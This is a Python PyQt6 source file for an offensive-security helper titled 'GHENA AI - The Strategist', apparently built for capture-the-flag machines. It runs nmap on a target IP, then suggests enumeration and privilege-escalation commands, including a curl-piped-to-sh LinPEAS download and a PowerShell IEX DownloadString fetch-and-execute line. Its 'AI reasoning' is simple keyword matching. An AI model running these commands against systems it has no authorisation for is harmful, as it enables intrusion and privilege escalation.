import sys, subprocess, time
from PyQt6.QtWidgets import *
from PyQt6.QtCore import QThread, pyqtSignal

# ---------------------------------------------------------
# المحرك التحليلي (The Brain) - يفهم الأهداف والأنظمة
# ---------------------------------------------------------
class GhenaStrategist:
    def __init__(self):
        self.os_type = "Unknown"  # Linux / Windows
        self.current_goal = "Initial Access" # Root / User / Discovery
        self.found_services = []

    def analyze_situation(self, nmap_output):
        """يقرر نوع النظام والخدمات المتاحة"""
        if "Microsoft" in nmap_output or "Windows" in nmap_output:
            self.os_type = "Windows"
        elif "Linux" in nmap_output or "Ubuntu" in nmap_output:
            self.os_type = "Linux"
        
        # تحليل الخدمات
        services = []
        if "80/tcp" in nmap_output or "443/tcp" in nmap_output: services.append("Web")
        if "445/tcp" in nmap_output: services.append("SMB")
        if "22/tcp" in nmap_output: services.append("SSH")
        self.found_services = services
        return f"Detected System: {self.os_type} | Services: {', '.join(services)}"

    def get_next_move(self, target_ip, goal):
        """يختار الأداة بناءً على الهدف والخدمات"""
        self.current_goal = goal
        decisions = []

        if goal == "Get user.txt":
            if "Web" in self.found_services:
                decisions.append({
                    "reason": "المنفذ 80 مفتوح، نحتاج اكتشاف المجلدات المخفية للوصول للمستخدم.",
                    "tool": "Gobuster",
                    "cmd": f"gobuster dir -u http://{target_ip}/ -w /usr/share/wordlists/dirb/common.txt -q"
                })
            if "SMB" in self.found_services:
                decisions.append({
                    "reason": "خدمة SMB مفعلة، ربما نجد ملفات مستخدم مسربة.",
                    "tool": "Enum4Linux",
                    "cmd": f"enum4linux -a {target_ip}"
                })

        elif goal == "Privilege Escalation":
            if self.os_type == "Linux":
                decisions.append({
                    "reason": "نظام لينكس مكتشف، سنقوم بتشغيل LinPeas للبحث عن ثغرات الروت.",
                    "tool": "LinPeas",
                    "cmd": f"curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
                })
            else:
                decisions.append({
                    "reason": "نظام ويندوز مكتشف، سنبحث عن ملفات WinPeas أو صلاحيات غير مؤمنة.",
                    "tool": "WinPeas",
                    "cmd": f"powershell IEX (New-Object Net.WebClient).DownloadString('http://{target_ip}/winPEAS.ps1')"
                })
        
        return decisions

# ---------------------------------------------------------
# الواجهة الذكية (Interactive Interface)
# ---------------------------------------------------------
class GhenaStrategistUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("GHENA AI - The Strategist v30.0")
        self.setMinimumSize(1100, 900)
        self.brain = GhenaStrategist()
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()

        # قسم الإدخال والهدف
        top_layout = QHBoxLayout()
        self.ip_input = QLineEdit(); self.ip_input.setPlaceholderText("Target IP...")
        self.goal_selector = QComboBox()
        self.goal_selector.addItems(["Initial Access", "Get user.txt", "Privilege Escalation", "Root Flag"])
        top_layout.addWidget(QLabel("IP:")); top_layout.addWidget(self.ip_input)
        top_layout.addWidget(QLabel("Goal:")); top_layout.addWidget(self.goal_selector)
        layout.addLayout(top_layout)

        # زر التحليل
        self.btn_analyze = QPushButton("🧠 ANALYZE & DECIDE"); self.btn_analyze.setFixedHeight(50)
        self.btn_analyze.setStyleSheet("background: #2c3e50; color: white; font-weight: bold;")
        layout.addWidget(self.btn_analyze)

        # منطقة عرض الأسباب والقرارات
        self.decision_box = QTextEdit(); self.decision_box.setReadOnly(True); self.decision_box.setMaximumHeight(150)
        self.decision_box.setStyleSheet("background: #fdf9e1; color: #7e4d0c; border: 1px solid #d4ac0d; font-size: 14px;")
        layout.addWidget(QLabel("<b>AI Reasoning & Strategy:</b>")); layout.addWidget(self.decision_box)

        # الكونسول
        self.console = QTextEdit(); self.console.setReadOnly(True)
        self.console.setStyleSheet("background: black; color: #00ff00; font-family: monospace;")
        layout.addWidget(QLabel("<b>Execution Console:</b>")); layout.addWidget(self.console)

        container = QWidget(); container.setLayout(layout); self.setCentralWidget(container)
        self.btn_analyze.clicked.connect(self.run_strategy)

    def log(self, text, color="#ffffff"):
        self.console.append(f"<font color='{color}'><b>{text}</b></font>")

    def run_strategy(self):
        ip = self.ip_input.text().strip()
        goal = self.goal_selector.currentText()
        if not ip: return

        # أولاً: فحص أولي إذا لم يكن لدينا بيانات
        self.log(f"\n[!] Initiating Strategy for Goal: {goal}", "#3498db")
        nmap_cmd = f"nmap -sV -Pn {ip}"
        self.log(f"[EXECUTING]: {nmap_cmd}", "#e67e22")
        
        # محاكاة لعملية التحليل بناءً على مخرجات Nmap (بشكل مبسط للفهم)
        # في الكود الحقيقي ستقوم بربط الـ Worker بـ analyze_situation
        self.worker = ExecutionWorker(nmap_cmd)
        self.worker.output_signal.connect(self.console.append)
        self.worker.finished_signal.connect(lambda: self.make_decisions(ip, goal))
        self.worker.start()

    def make_decisions(self, ip, goal):
        # تحليل المخرجات (هنا نستخدم مخرجات الكونسول السابقة)
        analysis_res = self.brain.analyze_situation(self.console.toPlainText())
        self.decision_box.setText(f"💡 {analysis_res}")
        
        decisions = self.brain.get_next_move(ip, goal)
        for d in decisions:
            self.decision_box.append(f"\n➡️ [Decision]: {d['tool']}\n❓ [Reason]: {d['reason']}")
            # تشغيل تلقائي أو يدوي حسب الرغبة
            self.log(f"\n[AI RECOMMENDS]: {d['cmd']}", "#f1c40f")

class ExecutionWorker(QThread):
    output_signal = pyqtSignal(str)
    finished_signal = pyqtSignal()
    def __init__(self, cmd):
        super().__init__(); self.cmd = cmd
    def run(self):
        p = subprocess.Popen(self.cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in p.stdout: self.output_signal.emit(line.strip())
        p.wait(); self.finished_signal.emit()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = GhenaStrategistUI(); window.show()
    sys.exit(app.exec())
